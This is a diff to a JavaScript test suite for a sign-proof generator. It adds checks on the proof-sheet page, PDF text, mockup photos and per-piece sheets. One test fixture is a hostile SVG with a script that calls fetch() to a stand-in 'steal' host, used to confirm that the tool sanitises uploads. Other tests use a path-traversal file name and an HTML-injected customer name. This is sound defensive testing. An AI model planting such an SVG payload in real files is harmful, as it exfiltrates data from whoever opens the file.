@@ -28,7 +28,7 @@ const palette = { primary: { name: 'Brown', hex: '#8B4513' }, accent: { name: 'C
 const brief = (over) => ({ status: 'ready', brief: { customer: 'Test Customer', proof_no: 1, date: '2026-11-10', palette, extra_colors: [], fields: { name: 'Oak Street Bakery', line2: 'Fresh Daily', phone: '', web: '' }, font: null, logos: [], notes: [], not_included: [], ...over } });
 
 // Runs the tool. logos: {file name: Buffer}. Returns the exit code, the JSON the tool printed, the folder and the report.
-function run(reply, { logos = {}, strict = false, noLogosFlag = false, briefFile, outDir } = {}) {
+function run(reply, { logos = {}, mockups = null, noSheet = false, strict = false, noLogosFlag = false, briefFile, outDir } = {}) {
   const dir = join(work, 'run-' + ++n);
   const logoDir = join(dir, 'logos');
   mkdirSync(logoDir, { recursive: true });
@@ -36,7 +36,12 @@ function run(reply, { logos = {}, strict = false, noLogosFlag = false, briefFile
   const file = briefFile || join(dir, 'reply.json');
   if (!briefFile) writeFileSync(file, JSON.stringify(reply));
   const out = outDir || join(dir, 'out');
-  const args = [CLI, '--brief', file, '--out', out, ...(noLogosFlag ? [] : ['--logos', logoDir]), ...(strict ? ['--strict'] : [])];
+  const mockupDir = join(dir, 'mockups');
+  if (mockups) {
+    mkdirSync(mockupDir, { recursive: true });
+    for (const [name, bytes] of Object.entries(mockups)) writeFileSync(join(mockupDir, name), bytes);
+  }
+  const args = [CLI, '--brief', file, '--out', out, ...(noLogosFlag ? [] : ['--logos', logoDir]), ...(mockups ? ['--mockups', mockupDir] : []), ...(noSheet ? ['--no-sheet'] : []), ...(strict ? ['--strict'] : [])];
   const res = spawnSync(process.execPath, args, { encoding: 'utf8', timeout: 180000 });
   let result = null;
   try { result = JSON.parse(res.stdout); } catch (_) { /* leave null: the assertion below says what stderr had */ }
@@ -54,7 +59,8 @@ const design = (out) => JSON.parse(readFileSync(join(out, 'design.json'), 'utf8'
 const textsOf = (side) => side.elements.filter((e) => e.type === 'text').map((e) => e.text);
 
 test('the example brief becomes the whole flat and a picture of every panel, turned and checked the way the Designer does', () => {
-  const r = run(null, { briefFile: EXAMPLES + 'honeydrop-throw.json', logos: { 'honeydrop-logo.svg': MARK } });
+  // the design's own checks, so no sheet here (the sheet's tests are below, and it has things to say: no mockup photo yet)
+  const r = run(null, { briefFile: EXAMPLES + 'honeydrop-throw.json', logos: { 'honeydrop-logo.svg': MARK }, noSheet: true });
   assert.equal(r.code, 0, r.stderr);
   assert.equal(r.result.ok, true);
   assert.equal(r.result.verdict, 'clean');
@@ -211,6 +217,90 @@ test('logo and words together, a panel with its own background, a font for every
   assert.equal(r.report.previews.length, 6);
 });
 
+const exampleReply = () => JSON.parse(readFileSync(EXAMPLES + 'honeydrop-throw.json', 'utf8'));
+const hasPdftotext = spawnSync('pdftotext', ['-v'], { encoding: 'utf8' }).error == null;
+
+test('the proof sheet is a 17 x 11 in page, a PNG at 200 dpi and a PDF with real text, with the reference proof\'s parts', () => {
+  const reply = exampleReply();
+  reply.brief.customer = 'Honeydrop <b>Apiary</b>';
+  reply.brief.pieces[0].mockup_file = 'photo.png';
+  const r = run(reply, { logos: { 'honeydrop-logo.svg': MARK }, mockups: { 'photo.png': makePng(900, 600) } });
+  assert.equal(r.code, 0, r.stderr);
+  assert.equal(r.report.sheets.length, 1);
+  const sheet = r.report.sheets[0];
+  assert.equal(sheet.png, 'proof-sheet-1-table-throw.png');
+  assert.equal(sheet.pdf, 'proof-sheet-1-table-throw.pdf');
+  assert.deepEqual([sheet.width, sheet.height], [3400, 2200], '17 x 11 in at 200 dpi');
+  assert.deepEqual(pngSize(join(r.out, sheet.png)), { w: 3400, h: 2200 });
+  assert.ok(readFileSync(join(r.out, sheet.png)).length > 100000, 'a page with art on it, not a blank one');
+  assert.ok(r.result.files.includes(sheet.png) && r.result.files.includes(sheet.pdf));
+
+  // the PDF is one page of 17 x 11 in (1224 x 792 points)
+  const pdf = readFileSync(join(r.out, sheet.pdf)).toString('latin1');
+  assert.ok(pdf.startsWith('%PDF'));
+  assert.ok(/\/MediaBox\s*\[\s*0 0 1224 792\s*\]/.test(pdf), 'a 17 x 11 in page');
+  assert.equal((pdf.match(/\/Type\s*\/Page[^s]/g) || []).length, 1);
+
+  // the page's words: the reference proof's lines, this proof's numbers, and the customer's name as plain text
+  const lines = [
+    'Get Seen Signs - Proof for Honeydrop <b>Apiary</b>', '6 ft 4-sided table throw | Proof 1 | Nov 8, 2026', 'GET SEEN SIGNS', '6 ft 4-sided table throw (Qty 1)',
+    'How it looks set up', 'Mockup for feel only. The flat art is what prints.', 'COLORS', 'NOTES',
+    'Colors on screen may vary slightly from print. Please review spelling and layout.', 'Proof 1 of up to 3 free revisions. Reply "Approved" or send any changes.',
+    'Honey gold (background) #F6C445', 'Charcoal (bars and blocks, text) #1F1A17',
+    'Logo is the customer\'s file, honeydrop-logo.svg, placed as is, not redrawn.',
+    'Side and back art is turned on the flat so it reads right side up when the cover hangs.', 'Hatched corners wrap the table corners and carry no art.',
+    'Panels as they read on the table: Front 72.66 x 27.65 in | Top 72.66 x 28.51 in | Left end 28.51 x 26.95 in | Right end 28.51 x 26.88 in | Back 72.66 x 27.81 in',
+    'Flat page 127.51 x 85.01 in | To scale', 'FRONT', 'TOP', 'LEFT END', 'RIGHT END', 'BACK', 'CORNER DRAPE',
+  ];
+  const flat = (t) => t.replace(/\s+/g, ' ');
+  for (const line of lines) assert.ok(flat(sheet.text).includes(flat(line)), `the page says "${line}"`);
+  assert.equal(sheet.mockup, true);
+  assert.equal(flat(sheet.text).includes('Mockup photo not added yet'), false);
+  assert.deepEqual(sheet.overflow, [], 'everything fits');
+  assert.ok(!r.report.attention.some((a) => /no mockup photo/.test(a)), r.report.attention.join(' | '));
+  if (hasPdftotext) {
+    const text = flat(spawnSync('pdftotext', ['-layout', join(r.out, sheet.pdf), '-'], { encoding: 'utf8' }).stdout);
+    for (const line of lines.slice(0, 12)) assert.ok(text.includes(flat(line)), `the PDF text has "${line}"`);
+  }
+  assert.deepEqual(r.report.blocked_requests, []);
+  assert.deepEqual(r.report.page_problems, []);
+});
+
+test('without a mockup photo the box is plainly empty and the report says so; --no-sheet makes no sheet', () => {
+  const none = run(exampleReply(), { logos: { 'honeydrop-logo.svg': MARK } });
+  assert.equal(none.code, 0, none.stderr);
+  const sheet = none.report.sheets[0];
+  assert.equal(sheet.mockup, false);
+  assert.ok(sheet.text.includes('Mockup photo not added yet'));
+  assert.ok(none.report.attention.some((a) => /Proof sheet 1: no mockup photo/.test(a)), none.report.attention.join(' | '));
+  assert.equal(none.report.verdict, 'needs_attention');
+  // the example brief's own note still hands a question to Scott, and the tool says that before it goes out
+  assert.ok(none.report.attention.some((a) => /Proof sheet 1: a note still has a question in it \("Print method: Scott to confirm\."\)/.test(a)), none.report.attention.join(' | '));
+
+  const off = run(exampleReply(), { logos: { 'honeydrop-logo.svg': MARK }, noSheet: true });
+  assert.equal(off.code, 0, off.stderr);
+  assert.deepEqual(off.report.sheets, []);
+  assert.deepEqual(readdirSync(off.out).filter((f) => /^proof-sheet/.test(f)), []);
+  assert.ok(!off.report.attention.some((a) => /Proof sheet/.test(a)));
+  assert.equal(readdirSync(join(off.out, 'previews')).length, 6, 'the pictures are still made');
+});
+
+test('a mockup the brief names has to be in the mockups folder', () => {
+  const reply = exampleReply();
+  reply.brief.pieces[0].mockup_file = 'photo.png';
+  const noFlag = run(reply, { logos: { 'honeydrop-logo.svg': MARK } });
+  assert.equal(noFlag.code, 1);
+  assert.match(noFlag.result.errors[0].message, /--mockups/);
+  const gone = run(reply, { logos: { 'honeydrop-logo.svg': MARK }, mockups: { 'other.png': makePng(10, 10) } });
+  assert.equal(gone.code, 1);
+  assert.match(gone.result.errors[0].message, /photo\.png is not in/);
+  // not a photo at all: refused with the path, before any browser starts
+  reply.brief.pieces[0].mockup_file = '../photo.png';
+  const bad = run(reply, { logos: { 'honeydrop-logo.svg': MARK } });
+  assert.equal(bad.code, 1);
+  assert.equal(bad.result.errors[0].path, 'pieces[0].mockup_file');
+});
+
 test('two pieces make one design with a flat or a picture per side for each, and a hostile logo cannot make the tool call out', () => {
   const evil = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100"><style>@import url(https://example.invalid/x.css);</style><image xlink:href="https://example.invalid/pixel.png" width="10" height="10"/><circle cx="50" cy="50" r="40" fill="#8B4513"/><script>fetch("https://example.invalid/steal")</script></svg>');
   const reply = brief({
@@ -234,6 +324,9 @@ test('two pieces make one design with a flat or a picture per side for each, and
   // the feather flag's template put the logo in its seal
   assert.equal(doc.project.pieces[1].sides[0].elements.filter((e) => e.type === 'image' && e.logoId).length, 1);
   assert.equal(r.report.pieces.length, 2);
+  assert.deepEqual(r.report.sheets.map((x) => [x.png, x.width, x.height]), [['proof-sheet-1-canopy-tent.png', 3400, 2200], ['proof-sheet-2-feather-flag.png', 3400, 2200]], 'a sheet for each piece');
+  assert.ok(r.report.sheets[0].text.includes('FRONT') && r.report.sheets[0].text.includes('RIGHT') && r.report.sheets[0].text.includes('BACK') && r.report.sheets[0].text.includes('LEFT'), 'every side of the canopy is drawn');
+  assert.ok(r.report.sheets[1].text.includes('CLOSE-UP') && r.report.sheets[1].text.includes('POLE SIDE'), 'the flag has its close-ups and its pole side');
   // words on a canopy side go in the gable's own block, inside the safe line
   assert.ok(!r.report.warnings.some((w) => w.panel === 'Right' || w.panel === 'Back'), JSON.stringify(r.report.warnings));
   // the SVG was cleaned like any customer upload, and nothing was fetched from outside or from /api
@@ -284,11 +377,13 @@ test('every product with every template builds into a design the proof request a
       try {
         const got = await page.evaluate(async ({ b, l }) => {
           const r = await (await import('/.design-dev/scripts/proof-from-brief/in-page.mjs')).run(b, l);
-          return { valid: r.report.doc_valid, previews: r.previews.map((p) => [p.file, p.base64.length]), sides: r.doc.project.pieces[0].sides.length };
+          return { valid: r.report.doc_valid, previews: r.previews.map((p) => [p.file, p.base64.length]), sides: r.doc.project.pieces[0].sides.length, sheets: r.sheets.map((sh) => sh.hero.figures.map((f) => f.svg.length)) };
         }, { b: checked.brief, l: logos });
         runs++;
         if (!got.valid.ok) failures.push(`${label}: invalid design ${got.valid.errors}`);
         if (!got.previews.length || got.previews.some(([, size]) => size < 1000)) failures.push(`${label}: pictures ${JSON.stringify(got.previews)}`);
+        // and the proof sheet's art: at least one figure, each a real drawing
+        if (got.sheets.length !== 1 || !got.sheets[0].length || got.sheets[0].some((size) => size < 300)) failures.push(`${label}: sheet figures ${JSON.stringify(got.sheets)}`);
       } catch (e) {
         failures.push(`${label}: ${e.message}`);
       }
